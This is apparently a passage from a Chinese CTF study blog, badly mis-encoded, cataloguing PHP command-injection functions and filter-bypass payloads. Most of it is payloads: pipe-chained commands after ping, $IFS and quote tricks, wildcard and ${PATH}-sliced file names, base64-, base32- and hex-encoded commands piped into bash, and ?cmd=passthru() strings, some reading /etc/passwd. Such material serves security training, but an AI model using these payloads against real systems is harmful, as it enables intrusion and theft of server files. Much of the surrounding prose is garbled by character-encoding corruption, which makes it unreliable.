*** popen() è¯­æ³•ä¸ºpopen(string $command, string $mode),commandå‚æ•°: è¦æ‰§è¡Œçš„å‘½ä»¤,modeå‚æ•°: æ¨¡å¼&#x27;r&#x27;è¡¨ç¤ºé˜…è¯»ï¼Œ&#x27;w&#x27; è¡¨ç¤ºå†™å…¥ã€‚ä¸èƒ½è‡ªå·±å›æ˜¾ï¼Œéœ€è¦print_rç­‰è¾“å‡ºå†…å®¹
*** proc_open() è¯­æ³•ä¸ºproc_open($command,$descriptor spec,$pipes,$cwd,$env vars,$options)
$commandæ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
$descriptorspecæ˜¯ä¸€ä¸ªæè¿°ç¬¦è§„èŒƒæ•°ç»„ï¼Œç”¨äºæŒ‡å®šè¿›ç¨‹çš„è¾“å…¥ã€è¾“å‡ºå’Œé”™è¯¯çš„æ–‡ä»¶æè¿°ç¬¦ã€‚
$pipesæ˜¯ä¸€ä¸ªå¼•ç”¨å˜é‡ï¼Œç”¨äºå­˜å‚¨ä¸è¿›ç¨‹ç›¸å…³çš„ç®¡é“ã€‚
$cwdï¼ˆå¯é€‰ï¼‰æ˜¯è®¾ç½®å­è¿›ç¨‹çš„å½“å‰å·¥ä½œç›®å½•ã€‚
$envï¼ˆå¯é€‰ï¼‰æ˜¯è®¾ç½®å­è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ã€‚
$other_optionsï¼ˆå¯é€‰ï¼‰æ˜¯å…¶ä»–é€‰é¡¹ï¼Œå¦‚è®¾ç½®è¶…æ—¶ç­‰
ä¸èƒ½ç›´æ¥å›æ˜¾
*** pcntl_exec()  è¯­æ³•æ ¼å¼ä¸ºpcntl exec(string $path, array $args = ?, array $envs = ?)
pathå¿…é¡»æ—¶å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„æˆ–ä¸€ä¸ªåœ¨æ–‡ä»¶ç¬¬ä¸€è¡ŒæŒ‡å®šäº† ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„æ ‡å¤´çš„è„šæœ¬ (æ¯”å¦‚æ–‡ä»¶ç¬¬ä¸€è¡Œæ˜¯#!/usr/local/bin/perlçš„perlè„šæœ¬)ã€‚argsæ˜¯ä¸€ä¸ªè¦ä¼ é€’ç»™ç¨‹åºçš„å‚æ•°çš„å­—ç¬¦ä¸²æ•°ç»„ã€‚
envsæ˜¯ä¸€ä¸ªè¦ä¼ é€’ç»™ç¨‹åºä½œä¸ºç¯å¢ƒå˜é‡çš„å­—ç¬¦ä¸²æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„æ˜¯ key =&gt; valueæ ¼å¼çš„ï¼Œkeyä»£è¡¨è¦ä¼ é€’çš„ç¯å¢ƒå˜é‡çš„åç§°ï¼Œvalueä»£è¡¨è¯¥ç¯å¢ƒå˜é‡å€¼ã€‚è¯¥å‡½æ•°æ²¡æœ‰å›æ˜¾ï¼Œè§£å†³æ–¹æ³•ä¸€ï¼šcatæ–‡ä»¶å¹¶è¾“å‡ºåˆ°æœ‰æƒé™è¯»å–è·¯å¾„ï¼›è§£å†³æ–¹æ³•äºŒï¼šshellåå¼¹</code></pre>

<p>é‚£ä¹ˆå¦‚æœé‡åˆ°ç±»ä¼¼PINGçš„æ‰§è¡Œæ¼æ´ï¼Œå¦‚ä½•å°†å‰é¢çš„å­—æ®µå’Œç³»ç»Ÿå‘½ä»¤æ— ç¼è¡”æ¥å‘¢ï¼Ÿ</p>
<p>é‚£ä¹ˆå°±éœ€è¦ç®¡é“ç¬¦æ¥æ”¯æŒï¼š</p>
<p>*<strong>å…³äºç®¡é“ç¬¦</strong></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/803305e48f88c6e5804f38315b798f21.png" alt="img"></p>
<p><strong>For Windowsï¼š</strong></p>
<p>â€œ|â€ : ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ã€‚ä¾‹å¦‚ï¼š<code>ping 127.0.0.1| whoami</code><br>â€œ||â€ : å¦‚æœå‰é¢æ‰§è¡Œçš„è¯­å¥æ‰§è¡Œå‡ºé”™ï¼Œåˆ™æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥ã€‚ä¾‹å¦‚ï¼š <code>ping 1234.1 || whoami</code><br>â€œ&amp;â€ : å¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ ã€‚ä¾‹å¦‚ï¼š <code>ping 127.0.0.1 &amp; whoami</code><br>â€œ&amp;&amp;â€ : å¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚ä¾‹å¦‚ï¼š <code>ping 127.0.0.1 &amp;&amp; whoami</code></p>
<p><strong>For Linux:</strong></p>
<p>â€œ;â€ : æ‰§è¡Œå®Œå‰é¢çš„è¯­å¥å†æ‰§è¡Œåé¢çš„ã€‚ ä¾‹å¦‚ï¼š <code>ping 127.0.0.1 ; whoami</code><br>â€œ|â€ : æ˜¾ç¤ºåé¢è¯­å¥çš„æ‰§è¡Œç»“æœã€‚åˆ—å¦‚ï¼š<code>ping 127.0.0.1 | whoami</code><br>â€œ||â€ : å½“å‰çš„è¯­å¥æ‰§è¡Œå‡ºé”™æ—¶ï¼Œæ‰§è¡Œåé¢çš„è¯­å¥ã€‚ ä¾‹å¦‚ï¼š <code>ping 1472.1 || whoami</code><br>â€œ&amp;â€ : å¦‚æœå‰é¢å¾—è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ï¼Œä¾‹å¦‚ï¼š<code>ping 127.0.0.1 | &amp; whoami</code><br>â€œ&amp;&amp;â€ : å¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„ï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚ä¾‹å¦‚ï¼š <code>ping 127.0.0.1 &amp;&amp; whoami</code></p>
<p>å‘ç°æ¼æ´åï¼Œå¦‚ä½•å¾—åˆ°æ§åˆ¶æƒå‘¢ï¼Ÿ</p>
<p>æœ€ç®€å•çš„æ¼æ´å°±æ˜¯æ‰¾åˆ°æ³¨å…¥ç‚¹ç›´æ¥æ³¨</p>
<p>ä½†æ˜¯éš¾å…ä¼šç¢°åˆ°å­˜åœ¨é»‘åå•çš„æƒ…å†µï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦ç»•è¿‡å‡ºåœºäº†</p>
<h2 id="ç©ºæ ¼è¿‡æ»¤ç»•è¿‡ï¼š"><a href="#ç©ºæ ¼è¿‡æ»¤ç»•è¿‡ï¼š" class="headerlink" title="ç©ºæ ¼è¿‡æ»¤ç»•è¿‡ï¼š"></a>ç©ºæ ¼è¿‡æ»¤ç»•è¿‡ï¼š</h2><h3 id="å¤§æ‹¬å·-ï¼š"><a href="#å¤§æ‹¬å·-ï¼š" class="headerlink" title="å¤§æ‹¬å·{}ï¼š"></a>å¤§æ‹¬å·{}ï¼š</h3><pre><code class="highlight plaintext">&#123;cat,flag.php&#125;</code></pre>

<h3 id="IFSä»£æ›¿ç©ºæ ¼ï¼š"><a href="#IFSä»£æ›¿ç©ºæ ¼ï¼š" class="headerlink" title="$IFSä»£æ›¿ç©ºæ ¼ï¼š"></a><code>$IFS</code>ä»£æ›¿ç©ºæ ¼ï¼š</h3><p><code>$IFS$9</code>ï¼Œ<code>$&#123;IFS&#125;</code>ï¼Œ<code>$IFS</code>è¿™ä¸‰ä¸ªéƒ½è¡Œ</p>
<p>Linuxä¸‹æœ‰ä¸€ä¸ªç‰¹æ®Šçš„ç¯å¢ƒå˜é‡å«åšIFSï¼Œå«åšå†…éƒ¨å­—æ®µåˆ†éš”ç¬¦ (internal field separator)ã€‚</p>
<pre><code class="highlight plaintext">?cmd=ls$IFS-I</code></pre>

<p>å•çº¯$IFS2,IFS2è¢«bashè§£é‡Šå™¨å½“åšå˜é‡åï¼Œè¾“ä¸å‡ºæ¥ç»“æœï¼ŒåŠ ä¸€ä¸ª{}å°±å›ºå®šäº†å˜é‡å</p>
<pre><code class="highlight plaintext">?cmd=ls$&#123;IFS&#125;-l</code></pre>

<p>$IFS$9åé¢åŠ ä¸ª$ä¸{}ç±»ä¼¼ï¼Œèµ·æˆªæ–­ä½œç”¨ï¼Œ$9æ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹ç¬¬ä¹ä¸ªå‚æ•°æŒæœ‰è€…å§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ã€‚</p>
<pre><code class="highlight plaintext">?cmd=ls$&#123;IFS&#125;$9-l</code></pre>

<h3 id="é‡å®šå‘å­—ç¬¦"><a href="#é‡å®šå‘å­—ç¬¦" class="headerlink" title="é‡å®šå‘å­—ç¬¦&lt;ï¼Œ&lt;&gt;"></a>é‡å®šå‘å­—ç¬¦&lt;ï¼Œ&lt;&gt;</h3><p>(å…·ä½“å“ªç§æƒ…æ™¯èƒ½ç”¨è¿˜ä¸å¤ªæ¸…æ¥š)</p>
<h3 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h3><p>%20ç»•è¿‡(ç›¸å½“äºurlç¼–ç çš„ç©ºæ ¼)</p>
<p>%09ç»•è¿‡ï¼ˆç›¸å½“äºTabé”®ï¼‰</p>
<p>%0aâ€“ä»£è¡¨æ¢è¡Œç¬¦</p>
<p>%0bâ€“ç”¨äºåœ¨è¾“å‡ºæˆ–æ˜¾ç¤ºæ–‡æœ¬æ—¶åœ¨è¯¥ä½ç½®äº§ç”Ÿä¸€ä¸ªå›ºå®šçš„å‚ç›´é—´è·ï¼Œç±»ä¼¼äºtabé”®ã€‚</p>
<p>%0dâ€“å›è½¦æ¢è¡Œ</p>
<p>%a0â€“ä»£è¡¨çš„æ˜¯éæ–­è¡Œç©ºæ ¼</p>
<p>%00â€“%00ä»£è¡¨çš„æ˜¯ASCIIç ä¸­çš„ç©ºå­—ç¬¦</p>
<p>å¯ä»¥å°†ç©ºæ ¼å­—ç¬¦æ›¿æ¢æˆæ³¨é‡Š&#x2F;**&#x2F;ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å†…è”æ³¨é‡Š<code>/!code/</code>        </p>
<p>å†…è”æ³¨é‡Šç»•è¿‡çŸ¥è¯†ç‚¹</p>
<pre><code>    å½“ä¸€äº›å…³é”®è¯­å¥è¢«è¿‡æ»¤æ—¶ï¼Œå†…è”æ³¨é‡Šå°±æ˜¯æŠŠä¸€äº›ç‰¹æœ‰çš„ä»…åœ¨ mysql ä¸Šçš„è¯­å¥æ”¾åœ¨ /*!  */ä¸­ï¼Œè¿™æ ·è¿™äº›è¯­å¥å¦‚æœåœ¨å…¶å®ƒæ•°æ®åº“ä¸­æ˜¯ä¸ä¼šè¢«æ‰§è¡Œï¼Œä½†åœ¨ mysql ä¸­ä¼šæ‰§è¡Œ
</code></pre>
<h2 id="æ–‡ä»¶åè¿‡æ»¤ç»•è¿‡ï¼š"><a href="#æ–‡ä»¶åè¿‡æ»¤ç»•è¿‡ï¼š" class="headerlink" title="æ–‡ä»¶åè¿‡æ»¤ç»•è¿‡ï¼š"></a>æ–‡ä»¶åè¿‡æ»¤ç»•è¿‡ï¼š</h2><h3 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="??,*ç»•è¿‡"></a>??,*ç»•è¿‡</h3><p><code>passthru</code>ä»£æ›¿<code>system</code>ï¼Œè¿‡æ»¤flagæ–‡ä»¶åç”¨?ï¼Œ*ç»•è¿‡</p>
<pre><code class="highlight plaintext">cat /fl??

cat /f*  #å¤šä¸ªåŒ¹é…ç»“æœåŒæ—¶å±•ç°</code></pre>

<p>ä»¥ä¸ŠæŒ‡ä»¤ç­‰æ•ˆäº<code>cat /flag</code></p>
<h3 id="è¿‡æ»¤"><a href="#è¿‡æ»¤" class="headerlink" title=";è¿‡æ»¤"></a>;è¿‡æ»¤</h3><p>åˆ©ç”¨?&gt;ç»•è¿‡</p>
<h3 id="è¿‡æ»¤-1"><a href="#è¿‡æ»¤-1" class="headerlink" title="&#x2F;è¿‡æ»¤"></a>&#x2F;è¿‡æ»¤</h3><p>ç”¨<code>printf</code> ä»¥åŠ<code>$()</code>ç»•è¿‡</p>
<pre><code class="highlight plaintext">$(printf$&#123;IFS&#125;&quot;\57&quot;)</code></pre>



<h3 id="å•å¼•å·-â€˜-åŒå¼•å·-â€œâ€-åå¼•å·-ç»•è¿‡æ­£åˆ™"><a href="#å•å¼•å·-â€˜-åŒå¼•å·-â€œâ€-åå¼•å·-ç»•è¿‡æ­£åˆ™" class="headerlink" title="å•å¼•å·(â€˜)åŒå¼•å·(â€œâ€)åå¼•å·(&#96;&#96;)ç»•è¿‡æ­£åˆ™"></a>å•å¼•å·(â€˜)åŒå¼•å·(â€œâ€)åå¼•å·(&#96;&#96;)ç»•è¿‡æ­£åˆ™</h3><pre><code class="highlight plaintext">cat /fl&quot;&quot;ag

c&quot;&quot;at /e&#x27;t&#x27;c/pas``s``wd</code></pre>

<p>å¯¹<code>php</code>æ¥è¯´è¿™æ˜¯<code>fl&quot;&quot;ag</code>è€Œä¸æ˜¯<code>flag</code>å…³é”®å­—ä¸ä¼šåŒ¹é…ä¸Šï¼Œä½†æ˜¯å¯¹äºlinuxç³»ç»Ÿæ¥è¯´<code>cat /fl&quot;&quot;ag</code>ç­‰æ•ˆäº<code>cat /flag</code>ã€‚å¤–é¢åŒ…è£¹çš„æ˜¯å•å¼•å·é‡Œé¢å°±æ˜¯åŒå¼•å·ï¼Œå¤–é¢åŒ…è£¹çš„æ˜¯åŒå¼•å·é‡Œé¢å°±æ˜¯å•å¼•å·ï¼Œæˆ–è€…ç”¨æ–œçº¿\å»æ‰åŠŸèƒ½æ€§ï¼Œé¿å…æŠ¥é”™</p>
<pre><code class="highlight plaintext">passthru(&#x27;cat /fl&quot;&quot;ag.p\&#x27;\&#x27;hp&#x27;)</code></pre>

<h3 id="åæ–œæ -ç»•è¿‡"><a href="#åæ–œæ -ç»•è¿‡" class="headerlink" title="åæ–œæ \ç»•è¿‡"></a>åæ–œæ \ç»•è¿‡</h3><p>\ç‰¹æ®Šå­—ç¬¦å»æ‰åŠŸèƒ½æ€§ï¼Œå•çº¯è¡¨ç¤ºä¸ºå­—ç¬¦ä¸²ï¼Œè€Œlinuxçœ‹åˆ°åæ–œçº¿\ä¼šè‡ªåŠ¨å¸®ä½ å»æ‰,æ­£å¸¸æ‰§è¡Œå‘½ä»¤</p>
<pre><code class="highlight plaintext">cat fl\ag.p\hp</code></pre>

<h3 id="ç‰¹æ®Šå˜é‡ï¼š-1åˆ°-9ã€-å’Œ"><a href="#ç‰¹æ®Šå˜é‡ï¼š-1åˆ°-9ã€-å’Œ" class="headerlink" title="ç‰¹æ®Šå˜é‡ï¼š$1åˆ°$9ã€$@å’Œ$*"></a>ç‰¹æ®Šå˜é‡ï¼š$1åˆ°$9ã€$@å’Œ$*</h3><p>è¿™äº›ç‰¹æ®Šå˜é‡è¾“å‡ºä¸ºç©º</p>
<pre><code class="highlight plaintext">cat /fl$9ag

cat /fl$@ag</code></pre>

<p>æˆ–è€…åœ¨å•è¯ç»“å°¾å¤„æ’å…¥$xï¼Œè¿™é‡Œçš„xå¯ä»¥æ˜¯ä»»æ„å­—æ¯ï¼Œä¾‹å¦‚å¯ä»¥å†™æˆå¦‚ä¸‹å½¢å¼ï¼š</p>
<pre><code class="highlight plaintext">c$@at /e$@tc/pas$@swd

cat$x /etc$x/passwd$x

ca$@t /etc$x/passwd$x</code></pre>

<h3 id="å†…è”æ‰§è¡Œç»•è¿‡ï¼ˆé€šè¿‡èµ‹å€¼ç»•è¿‡ï¼‰"><a href="#å†…è”æ‰§è¡Œç»•è¿‡ï¼ˆé€šè¿‡èµ‹å€¼ç»•è¿‡ï¼‰" class="headerlink" title="å†…è”æ‰§è¡Œç»•è¿‡ï¼ˆé€šè¿‡èµ‹å€¼ç»•è¿‡ï¼‰"></a>å†…è”æ‰§è¡Œç»•è¿‡ï¼ˆé€šè¿‡èµ‹å€¼ç»•è¿‡ï¼‰</h3><p>a&#x3D;c;b&#x3D;a;c&#x3D;t;$a$b$c &#x2F;1.txt</p>
<p>a&#x3D;f;c&#x3D;a;d&#x3D;g;b&#x3D;l;cat $a$b$c$d.phpï¼ˆabcdæ‹¼æ¥å‡ºæ¥flagï¼‰</p>
<h3 id="åˆ©ç”¨linuxä¸­çš„ç¯å¢ƒå˜é‡"><a href="#åˆ©ç”¨linuxä¸­çš„ç¯å¢ƒå˜é‡" class="headerlink" title="åˆ©ç”¨linuxä¸­çš„ç¯å¢ƒå˜é‡"></a>åˆ©ç”¨linuxä¸­çš„ç¯å¢ƒå˜é‡</h3><p>ä½¿ç”¨ç¯å¢ƒå˜é‡é‡Œçš„å­—ç¬¦æ‰§è¡Œå˜é‡</p>
<p>echo $PATH              #PATHé»˜è®¤ç³»ç»Ÿç¯å¢ƒå˜é‡</p>
<p>å¦‚æœå‡ºç°ï¼š</p>
<pre><code class="highlight bash">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</code></pre>

<p>åˆ™ä»¥ä¸‹ä»£ç è¡¨ç¤ºäº†flag.php</p>
<pre><code class="highlight plaintext">echo f$&#123;PATH:5:1&#125;$&#123;PATH:8:1&#125;$&#123;PATH:66:1&#125;.$&#123;PATH:93:1&#125;h$&#123;PATH:93:1&#125;</code></pre>

<p>æ¯”å¦‚${PATH:5:1}æŒ‡çš„æ˜¯å–è·¯å¾„çš„ç¬¬äº”ä½ï¼ˆä»0å¼€å§‹æ•°ï¼Œç¬¬0ä½æ˜¯&#x2F;ï¼‰çš„å­—ç¬¦ï¼Œæ­¥é•¿ä¸º1ï¼Œå³åªå–ä¸€ä¸ªå­—æ¯lï¼Œä»¥æ­¤ç±»æ¨å°±èƒ½æ‹¼æ¥æˆå…³é”®å­—<code>flag.php</code></p>
<h2 id="å¸¸è§æ–‡ä»¶è¯»å–å‘½ä»¤ç»•è¿‡ï¼š"><a href="#å¸¸è§æ–‡ä»¶è¯»å–å‘½ä»¤ç»•è¿‡ï¼š" class="headerlink" title="å¸¸è§æ–‡ä»¶è¯»å–å‘½ä»¤ç»•è¿‡ï¼š"></a>å¸¸è§æ–‡ä»¶è¯»å–å‘½ä»¤ç»•è¿‡ï¼š</h2><h3 id="base64ç¼–ç ï¼š"><a href="#base64ç¼–ç ï¼š" class="headerlink" title="base64ç¼–ç ï¼š"></a>base64ç¼–ç ï¼š</h3><pre><code class="highlight plaintext">cat flag.php--&gt; Y2FOIGZSYWcucGhw
echo Y2FOIGZsYWcucGhw | base64 -d</code></pre>

<p>ç®¡é“ç¬¦|æŠŠå‰é¢æŒ‡ä»¤æ‰§è¡Œçš„ç»“æœï¼Œå˜æˆåé¢æŒ‡ä»¤çš„å‚æ•°ï¼Œæ‰€ä»¥è¿™é‡Œä¼šè§£ç è¯»å–å‘½ä»¤</p>
<p>æ‰§è¡Œå‘½ä»¤çš„è¯æœ‰ä¸‰ç§å½¢å¼ï¼š</p>
<pre><code class="highlight plaintext">echo Y2FOIGZsYWcucGhw | base64 -d | bash

$(echo Y2FOIGZsYWcucGhw | base64 -d)

`echo Y2FOIGZsYWcucGhw | base64 -d`   #åå¼•å·</code></pre>

<p> æŠŠ<code>cat flag.php</code>ï¼Œæ”¾åœ¨bashé‡Œæ‰§è¡Œï¼ŒåŒç†æƒ³æ¢æˆä»€ä¹ˆå‘½ä»¤å°±base64ç¼–ç åæ›¿æ¢</p>
<h3 id="base32ç¼–ç åŒç†"><a href="#base32ç¼–ç åŒç†" class="headerlink" title="base32ç¼–ç åŒç†"></a>base32ç¼–ç åŒç†</h3><pre><code class="highlight plaintext">?cmd=system(&#x27;echo &quot;MNQXIIDGNRQWOLTQNBYA====&quot;|base32 -d|/bin/bash&#x27;);</code></pre>

<h3 id="HEXç¼–ç ï¼ˆASCIIç¼–ç ï¼‰"><a href="#HEXç¼–ç ï¼ˆASCIIç¼–ç ï¼‰" class="headerlink" title="HEXç¼–ç ï¼ˆASCIIç¼–ç ï¼‰"></a>HEXç¼–ç ï¼ˆASCIIç¼–ç ï¼‰</h3><h4 id="pythonè„šæœ¬"><a href="#pythonè„šæœ¬" class="headerlink" title="pythonè„šæœ¬"></a>pythonè„šæœ¬</h4><pre><code class="highlight plaintext">import binascii
s = b&quot;tac flag&quot;
h = binascii.b2a_hex(s)
print(h)</code></pre>

<p>tac flagâ€“&gt; 74616320666c6167</p>
<pre><code class="highlight plaintext">echo &quot;74616320666c6167â€|xxd -r -p|bash</code></pre>

<h4 id="xxd-äºŒè¿›åˆ¶æ˜¾ç¤ºå’Œå¤„ç†æ–‡ä»¶å·¥å…·ã€‚"><a href="#xxd-äºŒè¿›åˆ¶æ˜¾ç¤ºå’Œå¤„ç†æ–‡ä»¶å·¥å…·ã€‚" class="headerlink" title="xxd: äºŒè¿›åˆ¶æ˜¾ç¤ºå’Œå¤„ç†æ–‡ä»¶å·¥å…·ã€‚"></a>xxd: äºŒè¿›åˆ¶æ˜¾ç¤ºå’Œå¤„ç†æ–‡ä»¶å·¥å…·ã€‚</h4><p>-r-på°†çº¯åå…­è¿›åˆ¶è½¬å‚¨çš„åå‘è¾“å‡ºæ‰“å°ä¸ºäº†ASCIIæ ¼å¼<br>bashã€shã€&#x2F;bin&#x2F;bashã€åå¼•å·ç­‰</p>
<pre><code class="highlight plaintext">?cmd=passthru(&#x27;echo &quot;74616320666c6167â€|xxd -r -p|bash&#x27;);</code></pre>

<h4 id="shellcodeç¼–ç ï¼ˆ16è¿›åˆ¶çš„æœºå™¨ç ï¼‰"><a href="#shellcodeç¼–ç ï¼ˆ16è¿›åˆ¶çš„æœºå™¨ç ï¼‰" class="headerlink" title="shellcodeç¼–ç ï¼ˆ16è¿›åˆ¶çš„æœºå™¨ç ï¼‰"></a>shellcodeç¼–ç ï¼ˆ16è¿›åˆ¶çš„æœºå™¨ç ï¼‰</h4><pre><code class="highlight plaintext">?cmd=passthru(&#x27;printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;|bash&#x27;);

?cmd=passthru(&#x27;`printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;`&#x27;);

?cmd=passthru(&#x27;$(printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;)&#x27;);</code></pre>

<h2 id="è¯»å–å‘½ä»¤è¢«ç»•è¿‡ï¼š"><a href="#è¯»å–å‘½ä»¤è¢«ç»•è¿‡ï¼š" class="headerlink" title="è¯»å–å‘½ä»¤è¢«ç»•è¿‡ï¼š"></a>è¯»å–å‘½ä»¤è¢«ç»•è¿‡ï¼š</h2><p>æ¯”å¦‚è¯´è¿‡æ»¤äº†catï¼Œåœ¨è¿™ä¹‹å‰å…ˆåˆ†æ¸…:</p>
<p><code>cat flag.php</code> æ˜¯ç”¨äºåœ¨ç»ˆç«¯ä¸Šæ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹åä¸º <code>flag.php</code> çš„æ–‡ä»¶çš„å†…å®¹ã€‚</p>
<p><code>cat /flag</code> æ˜¯ç”¨äºåœ¨ç»ˆç«¯ä¸Šæ˜¾ç¤ºæ ¹ç›®å½•ä¸‹åä¸º flag çš„æ–‡ä»¶çš„å†…å®¹ã€‚</p>
<p><code>cat flag</code> æ˜¯ç”¨äºåœ¨ç»ˆç«¯ä¸Šæ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹åä¸º flag çš„æ–‡ä»¶çš„å†…å®¹ã€‚</p>
<p>æ­£å¸¸æ¥è¯´flagæ”¾åœ¨æ ¹ç›®å½•ä¸‹ï¼Œä¸è¿‡ä¹Ÿå¯èƒ½æ˜¯åœ¨å½“å‰ç½‘é¡µç›®å½•ä¸‹</p>
<p>åˆ«çš„æŒ‡ä»¤ä¹ŸåŒç†</p>
<ul>
<li><p>tac:åå‘æ˜¾ç¤ºï¼Œä»æœ€åä¸€è¡Œå¼€å§‹å¾€å‰æ˜¾ç¤º</p>
<pre><code class="highlight plaintext">tac /flag</code></pre>


</li>
<li><p>more:ä¸€é¡µä¸€é¡µæ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹</p>
<pre><code class="highlight plaintext">more flag.php</code></pre>


</li>
<li><p>lessï¼šä¸moreç±»ä¼¼</p>
</li>
<li><p>tailï¼šæŸ¥çœ‹æœ«å°¾å‡ è¡Œ</p>
</li>
<li><p>nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·</p>
<pre><code class="highlight plaintext">nl /flag</code></pre></li>
</ul>
<p><code>nl /flag</code> å’Œ <code>nl flag</code> æ˜¯ä¸åŒçš„ã€‚</p>
<p>åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œ<code>nl</code>å‘½ä»¤ç”¨äºç»™æ–‡ä»¶æ·»åŠ è¡Œå·ã€‚å½“ä½¿ç”¨ <code>nl /flag</code> å‘½ä»¤æ—¶ï¼Œ<code>/flag</code> è¢«è§†ä¸ºä¸€ä¸ªæ–‡ä»¶è·¯å¾„ï¼Œå¹¶å°†è¯¥æ–‡ä»¶çš„å†…å®¹è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºï¼ˆé€šå¸¸æ˜¯ç»ˆç«¯ï¼‰ï¼Œå¹¶åœ¨æ¯ä¸€è¡Œå‰æ·»åŠ è¡Œå·ã€‚å¦‚æœ &#x2F;flag æ–‡ä»¶å­˜åœ¨ä¸”æœ‰è¯»å–æƒé™ï¼Œé‚£ä¹ˆ <code>nl /flag</code> å°†ä¼šç»™è¯¥æ–‡ä»¶çš„å†…å®¹æ·»åŠ è¡Œå·ã€‚</p>
<p>è€Œå½“ä½¿ç”¨ <code>nl flag</code> å‘½ä»¤æ—¶ï¼Œflag è¢«è§†ä¸ºä¸€ä¸ªç›¸å¯¹äºå½“å‰ç›®å½•çš„æ–‡ä»¶è·¯å¾„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>nl flag</code> å‘½ä»¤å°†ä¼šå°è¯•åœ¨å½“å‰ç›®å½•ä¸‹æ‰¾åˆ°åä¸º flag çš„æ–‡ä»¶ï¼Œå¹¶ç»™å…¶å†…å®¹æ·»åŠ è¡Œå·ã€‚ï¼ˆä¸è¿‡flagä¸€èˆ¬åœ¨æ ¹ç›®å½•ï¼‰</p>
<ul>
<li>odï¼šä»¥äºŒè¿›åˆ¶æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹ã€‚æ­£å¸¸çš„<code>od /flag</code>è¾“å‡ºçš„çº¯çº¯äºŒè¿›åˆ¶<br>æƒ³çœ‹åˆ°æ–‡ä»¶å†…å®¹éœ€è¦ï¼š</li>
</ul>
<pre><code class="highlight plaintext">passthru(&quot;od -A d -c /fla\g&quot;);</code></pre>

<ul>
<li><p>xxdï¼šè¯»å–äºŒè¿›åˆ¶æ–‡ä»¶</p>
<pre><code class="highlight plaintext">xxd /flag</code></pre>


</li>
<li><p>sortï¼šä¸»è¦ç”¨äºæ’åºæ–‡ä»¶ </p>
<pre><code class="highlight plaintext">so?t /flag
/usr/bin/s?rt /flag</code></pre></li>
</ul>
<p><code>/usr/bin/sort</code> å’Œ <code>sort</code> å®é™…ä¸Šæ˜¯åŒä¸€ä¸ªå‘½ä»¤ã€‚<code>/usr/bin</code> ç›®å½•æ˜¯ç³»ç»Ÿçš„æ ‡å‡†ç›®å½•ä¹‹ä¸€ï¼Œå®ƒåŒ…å«äº†è®¸å¤šç³»ç»Ÿå‘½ä»¤å’Œå·¥å…·çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè€Œ sort å‘½ä»¤é€šå¸¸å°±å­˜æ”¾åœ¨ <code>/usr/bin</code> ç›®å½•ä¸­,å› æ­¤<code>/usr/bin/sort /flag</code> å’Œ <code>sort /flag</code> æ˜¯ç­‰ä»·çš„ã€‚æœ‰æ—¶å€™sortä¸è¡Œå¯èƒ½<code>/usr/bin/s?r</code>tå¯ä»¥</p>
<ul>
<li>uniqï¼šæŠ¥å‘Šæˆ–åˆ é™¤æ–‡ä»¶ä¸­é‡å¤çš„è¡Œï¼Œå…¶å®å½“æˆcatç”¨å°±è¡Œ</li>
<li>file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹<br>passthru(â€œfile -f &#x2F;flagâ€);</li>
<li>grepï¼šåœ¨æ–‡æœ¬ä¸­æŸ¥æ‰¾æŒ‡å®šå­—ç¬¦ä¸²<br>passthru(â€œgrep fla &#x2F;fla*â€);</li>
</ul>
